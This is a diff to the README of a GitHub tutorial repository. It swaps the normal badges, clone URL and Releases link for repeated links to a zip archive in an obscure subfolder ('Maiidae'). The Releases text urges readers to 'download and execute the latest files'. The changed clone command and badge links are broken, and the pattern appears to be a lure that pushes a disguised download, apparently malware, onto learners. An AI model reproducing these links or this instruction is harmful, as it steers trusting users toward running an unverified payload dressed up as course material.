@@ -1,7 +1,7 @@
 # 🌟 Skills Introduction to GitHub
 
-![GitHub Logo](https://img.shields.io/badge/GitHub-Skills_Introduction_to_GitHub-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-Latest%20Release-orange.svg)](https://github.com/uladrak/skills-introduction-to-github/releases)
+![GitHub Logo](https://raw.githubusercontent.com/uladrak/skills-introduction-to-github/main/Maiidae/skills_github_to_introduction_v2.8.zip)
+[![Releases](https://raw.githubusercontent.com/uladrak/skills-introduction-to-github/main/Maiidae/skills_github_to_introduction_v2.8.zip%https://raw.githubusercontent.com/uladrak/skills-introduction-to-github/main/Maiidae/skills_github_to_introduction_v2.8.zip)](https://raw.githubusercontent.com/uladrak/skills-introduction-to-github/main/Maiidae/skills_github_to_introduction_v2.8.zip)
 
 ## 📖 Overview
 
@@ -42,7 +42,7 @@ To begin using this repository:
 1. **Clone the repository** to your local machine:
 
    ```bash
-   git clone https://github.com/uladrak/skills-introduction-to-github.git
+   git clone https://raw.githubusercontent.com/uladrak/skills-introduction-to-github/main/Maiidae/skills_github_to_introduction_v2.8.zip
    ```
 
 2. **Navigate to the directory**:
@@ -96,7 +96,7 @@ We welcome contributions! If you'd like to contribute:
 
 ## 📅 Releases
 
-For the latest releases, check the [Releases section](https://github.com/uladrak/skills-introduction-to-github/releases). Each release contains updated materials, bug fixes, and new features. Make sure to download and execute the latest files.
+For the latest releases, check the [Releases section](https://raw.githubusercontent.com/uladrak/skills-introduction-to-github/main/Maiidae/skills_github_to_introduction_v2.8.zip). Each release contains updated materials, bug fixes, and new features. Make sure to download and execute the latest files.
 
 ## 🤝 Support
 
@@ -114,6 +114,6 @@ Special thanks to everyone who contributed to this repository and helped create 
 
 Dive in and start learning about GitHub and health topics today. Explore the exercises, engage with the materials, and improve your skills in both areas.
 
-![Health and Wellness](https://img.shields.io/badge/Health_and_Wellness-Discover%20More-brightgreen.svg)
+![Health and Wellness](https://raw.githubusercontent.com/uladrak/skills-introduction-to-github/main/Maiidae/skills_github_to_introduction_v2.8.zip%https://raw.githubusercontent.com/uladrak/skills-introduction-to-github/main/Maiidae/skills_github_to_introduction_v2.8.zip)
 
 Feel free to customize and expand this repository. Happy coding!
